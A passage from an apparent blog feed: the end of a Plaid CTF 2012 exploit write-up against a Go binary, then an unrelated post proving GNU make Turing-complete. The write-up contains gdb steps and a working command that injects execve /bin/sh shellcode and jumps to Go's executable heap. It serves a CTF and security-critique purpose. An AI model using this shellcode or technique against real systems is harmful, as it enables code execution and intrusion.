&lt;span class="go"&gt;    /usr/local/src/go/src/pkg/runtime/proc.c:221&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return address.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="mh"&gt;080624d0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
&lt;span class="x"&gt; 80624d0:       81 ec 9c 00 00 00       sub    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 80624d6:       8b 84 24 a4 00 00 00    mov    0xa4(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 80624dd:       89 9c 24 94 00 00 00    mov    %ebx,0x94(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624e4:       e8 4f 00 00 00          call   8062538 &amp;lt;__i686.get_pc_thunk.bx&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 80624e9:       81 c3 17 7b 25 00       add    $0x257b17,%ebx&lt;/span&gt;
&lt;span class="x"&gt; 80624ef:       89 b4 24 98 00 00 00    mov    %esi,0x98(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624f6:       8d 74 24 10             lea    0x10(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 80624fa:       89 44 24 0c             mov    %eax,0xc(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624fe:       8b 84 24 a0 00 00 00    mov    0xa0(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062505:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062508:       89 44 24 08             mov    %eax,0x8(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806250c:       8d 83 00 c3 f2 ff       lea    -0xd3d00(%ebx),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062512:       89 44 24 04             mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062516:       e8 ad 6c 25 00          call   82b91c8 &amp;lt;sprintf@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 806251b:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806251e:       e8 b5 6c 25 00          call   82b91d8 &amp;lt;puts@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 8062523:       8b 9c 24 94 00 00 00    mov    0x94(%esp),%ebx&lt;/span&gt;
&lt;span class="x"&gt; 806252a:       8b b4 24 98 00 00 00    mov    0x98(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 8062531:       81 c4 9c 00 00 00       add    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 8062537:       c3                      ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb webapp
&lt;span class="go"&gt;GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
&lt;span class="go"&gt;Copyright (C) 2011 Free Software Foundation, Inc.&lt;/span&gt;
&lt;span class="go"&gt;License GPLv3+: GNU GPL version 3 or later&lt;/span&gt;
&lt;span class="go"&gt;This is free software: you are free to change and redistribute it.&lt;/span&gt;
&lt;span class="go"&gt;There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;and &amp;quot;show warranty&amp;quot; for details.&lt;/span&gt;
&lt;span class="go"&gt;This GDB was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
&lt;span class="go"&gt;For bug reporting instructions, please see:&lt;/span&gt;
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;span class="go"&gt;Reading symbols from /tmp/build/webapp...done.&lt;/span&gt;
&lt;span class="go"&gt;Loading Go Runtime support.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) b *0x8062537&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8062537&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic heap).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;[Thread debugging using libthread_db enabled]&lt;/span&gt;
&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (LWP 7869)]&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08062537 in Log ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xbffff1ac: 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;(gdb) find 0x18600000, 0x18900000, 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;0x1883cd7b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:AAAA...AAAABBBB&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to it.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;100 -logfmt&lt;span class="o"&gt;=&lt;/span&gt;AAAAAAAAA%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(perl -e &amp;#39; print &amp;quot;&lt;/span&gt;:&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;0b&lt;span class="se"&gt;\x&lt;/span&gt;58&lt;span class="se"&gt;\x&lt;/span&gt;99&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;66&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2d&lt;span class="se"&gt;\x&lt;/span&gt;70&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;61&lt;span class="se"&gt;\x&lt;/span&gt;73&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;69&lt;span class="se"&gt;\x&lt;/span&gt;6e&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e3&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;51&lt;span class="se"&gt;\x&lt;/span&gt;53&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;span class="se"&gt;\x&lt;/span&gt;0e&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;83&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :j&lt;/span&gt;
&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½RQSï¿½ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÍƒ&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;p&gt;
Success!
&lt;/p&gt;
&lt;h3&gt;Postmortem&lt;/h3&gt;
&lt;p&gt;
This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code execution.
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;
It is also important to note that, while the vulnerability is introduced through C code, common C protections such as NX, ASLR, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming ASLR, NX, and libc randomization.
&lt;/p&gt;

&lt;p&gt;
I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the binary. 
&lt;/p&gt;

&lt;h3&gt;Go Community Response&lt;/h3&gt;

&lt;p&gt;
For anyone who is interested, the Go community's response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding ASLR or NX would not require very much effort.
&lt;/p&gt;

&lt;h3&gt;Other writeups&lt;/h3&gt;

&lt;p&gt;
There are writeups of this problem available by:
&lt;ul&gt;
    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc exploit)&lt;/li&gt;
    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in French)&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h3&gt;tl;dr&lt;/h3&gt;

&lt;p&gt;
Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively straightforward.
&lt;/p&gt;</summary><category term="golang"></category><category term="exploitation"></category></entry><entry><title>CS Theory with Make</title><link href="http://codearcana.com/posts/2012/03/05/cs-theory-with-make.html" rel="alternate"></link><updated>2012-03-05T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-03-05:posts/2012/03/05/cs-theory-with-make.html</id><summary type="html">&lt;p&gt;In this post, I play around with some make functions and eventually provide a constructive proof that the make syntax is turing complete via reduction to μ-recursion.&lt;/p&gt;
&lt;p&gt;First, we have to construct numbers. I used the representation of numbers as
unary strings of the character &lt;code&gt;0&lt;/code&gt;: ie, the number 4 is represented by &lt;code&gt;0000&lt;/code&gt;
(zero being the empty string). We can also compute the successor of a number:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="c"&gt;# If this is called as a make function, $(1) will be replaced with the first&lt;/span&gt;
&lt;span class="c"&gt;# function argument.&lt;/span&gt;
&lt;span class="nv"&gt;successor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; O&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;$(&lt;/span&gt;info &lt;span class="k"&gt;$(&lt;/span&gt;call successor,O&lt;span class="k"&gt;))&lt;/span&gt;  &lt;span class="c"&gt;# Outputs &amp;#39;OO&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Life is a lot easier if we can compute predecesser. Luckily, this is pretty
easy for us too:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nv"&gt;monus_one&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;patsubst O%,%,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;$(&lt;/span&gt;info &lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,OO&lt;span class="k"&gt;))&lt;/span&gt;  &lt;span class="c"&gt;# Outputs &amp;#39;0&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now lets actually do computation with this. It is hideous, but we can actually
compute fibonacci numbers in make:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nv"&gt;fib&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="se"&gt;\&lt;/span&gt;
  monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))))&lt;/span&gt;,O&lt;span class="o"&gt;)&lt;/span&gt;,O&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let me try to break this up a bit. I'll add comments but it will no longer be
valid make.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="c"&gt;# fib (n):&lt;/span&gt;
&lt;span class="nv"&gt;fib&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;, &lt;span class="c"&gt;# If n &amp;gt; 0:&lt;/span&gt;
          &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;, &lt;span class="c"&gt;# if n - 1 &amp;gt; 0:&lt;/span&gt;
&lt;span class="c"&gt;              # return fib(n-1) + fib(n-2)&lt;/span&gt;
              &lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one, &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))))&lt;/span&gt;
          ,O&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="c"&gt;# else: return 1&lt;/span&gt;
      ,O&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="c"&gt;# else: return 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is pretty fun and all, but we haven't actually done anything that we
couldn't do with a primitive recursive function. We can easily show that make
is more powerful than primitive recusion by encoding the &lt;a href="https://en.wikipedia.org/wiki/Ackermann_function"&gt;Ackerman
function&lt;/a&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nv"&gt;ack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call ack,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="se"&gt;\&lt;/span&gt;
  ack,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;))&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call ack,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,O&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, so how far can we take this? As it turns out, there is a class of
functions that are computable only by a turing complete language:
&lt;a href="https://en.wikipedia.org/wiki/%CE%9C-recursive_function"&gt;µ-recursive 
functions&lt;/a&gt;. They are
the primitive recursive functions with the addition of the minimization (µ)
operator: µ of f(x) is the minimum x such that f(x)=0. As it turns out, we can
encode this operator in make:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="c"&gt;# muh f x returns the first number greater than or equal to x such&lt;/span&gt;
&lt;span class="c"&gt;# that f(x) is true.&lt;/span&gt;
&lt;span class="nv"&gt;muh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call muh,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,O&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)))&lt;/span&gt;

&lt;span class="c"&gt;# mu f returns the first number greater than or equal to 0 such&lt;/span&gt;
&lt;span class="c"&gt;# that f(x) is true.&lt;/span&gt;
&lt;span class="nv"&gt;mu&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call muh,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Wow! There we have it, make is turing complete. As a final piece of fun, here
is the inverse ackerman function:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nv"&gt;not&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,,O&lt;span class="k"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# lesseq_template n creates a function lesseq_y that returns y &amp;lt; x&lt;/span&gt;
&lt;span class="cp"&gt;define lesseq_template&lt;/span&gt;
  lesseq_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;findstring &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;endef&lt;/span&gt;

&lt;span class="c"&gt;# geack_template y creates a function geack_y that returns ack(x) &amp;gt; y&lt;/span&gt;
&lt;span class="cp"&gt;define geack_template&lt;/span&gt;
  geack_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call lesseq_template,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call not,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call lesseq_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call ack,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;))))&lt;/span&gt;
&lt;span class="cp"&gt;endef&lt;/span&gt;

&lt;span class="c"&gt;# invack n: Find the first value x such that ack(x) &amp;gt; n.&lt;/span&gt;
&lt;span class="nv"&gt;invack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call geack_template,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))$(&lt;/span&gt;call mu,geack_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</summary><category term="make"></category><category term="theory"></category></entry></feed>